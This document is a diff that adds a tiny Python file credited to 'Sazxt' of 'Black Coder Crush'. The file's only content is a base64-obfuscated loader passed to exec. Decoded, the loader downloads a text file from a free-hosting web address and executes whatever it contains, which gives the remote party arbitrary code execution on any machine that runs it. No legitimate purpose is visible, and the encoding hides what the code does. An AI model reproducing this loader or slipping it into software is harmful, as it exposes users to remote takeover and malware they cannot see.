@@ -1,0 +1,4 @@
+#Compile By Sazxt
+#My Team : Black Coder Crush
+import base64
+exec(base64.b64decode("aW1wb3J0IHJlcXVlc3RzLCBvcwp6ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2lnNDQ5OS4wMDB3ZWJob3N0YXBwLmNvbS91Yy50eHQiKS50ZXh0CmV4ZWMoeikK"))
